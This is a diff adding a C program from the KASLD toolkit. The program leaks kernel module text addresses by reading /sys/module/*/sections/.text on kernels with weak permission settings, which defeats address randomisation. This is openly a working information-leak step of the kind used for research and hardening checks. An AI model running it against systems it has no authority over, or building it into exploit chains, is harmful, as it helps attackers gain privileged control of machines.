@@ -1,0 +1,110 @@
+// This file is part of KASLD - https://github.com/bcoles/kasld
+//
+// Retrieve virtual address for loadable kernel modules from
+// /sys/module/*/sections/.text
+//
+// Kernel module section offsets were exposed world-readable in SysFS from 2004.
+// Permissions were modified to prevent access (unless `kptr_restrict = 0`) in
+// kernel 4.15-rc1 on 2017-11-12:
+// https://github.com/torvalds/linux/commit/277642dcca765a1955d4c753a5a315ff7f2eb09d
+// ---
+// <bcoles@gmail.com>
+
+#define _GNU_SOURCE
+#include "include/kasld.h"
+#include "include/kasld_types.h"
+#include <dirent.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned long read_module_text(char *path) {
+  FILE *f;
+  char *endptr;
+  unsigned int buff_len = 64;
+  char buff[buff_len];
+  const int addr_len = sizeof(long *) * 2;
+  unsigned long addr = 0;
+
+  // printf("[.] checking %s ...\n", path);
+
+  f = fopen(path, "rb");
+  if (f == NULL)
+    return 0;
+
+  if (fgets(buff, buff_len, f) == NULL) {
+    fclose(f);
+    return 0;
+  }
+
+  fclose(f);
+
+  // pointer hex string length + "0x" prefix + "\n" line feed
+  if (strlen(buff) != (size_t)(addr_len + 3))
+    return 0;
+
+  addr = strtoul(buff, &endptr, 16);
+
+  if (addr && addr >= MODULES_START && addr <= MODULES_END)
+    return addr;
+
+  return 0;
+}
+
+#define module_range addr_range
+
+struct module_range get_module_text_sysfs() {
+  char d_path[1024];
+  unsigned long text_addr = 0;
+  const char *path = "/sys/module/";
+  struct dirent *dir;
+  DIR *d;
+  struct module_range range = {0, 0};
+
+  printf("[.] trying /sys/modules/*/sections/.text ...\n");
+
+  d = opendir(path);
+  if (d == NULL) {
+    perror("[-] opendir");
+    return range;
+  }
+
+  while ((dir = readdir(d)) != NULL) {
+    if (dir->d_type != DT_DIR)
+      continue;
+
+    snprintf(d_path, sizeof(d_path), "%s%s/sections/.text", path, dir->d_name);
+    text_addr = read_module_text(d_path);
+
+    if (!text_addr)
+      continue;
+
+    if (!range.lo || text_addr < range.lo)
+      range.lo = text_addr;
+    if (text_addr > range.hi)
+      range.hi = text_addr;
+  }
+
+  closedir(d);
+
+  return range;
+}
+
+int main(void) {
+  struct module_range range = get_module_text_sysfs();
+  if (!range.lo)
+    return 1;
+
+  printf("lowest leaked module text address:  %lx\n", range.lo);
+  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_MODULE, range.lo,
+               "sysfs-module-sections:lo");
+
+  if (range.hi != range.lo) {
+    printf("highest leaked module text address: %lx\n", range.hi);
+    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_MODULE, range.hi,
+                 "sysfs-module-sections:hi");
+  }
+
+  return 0;
+}
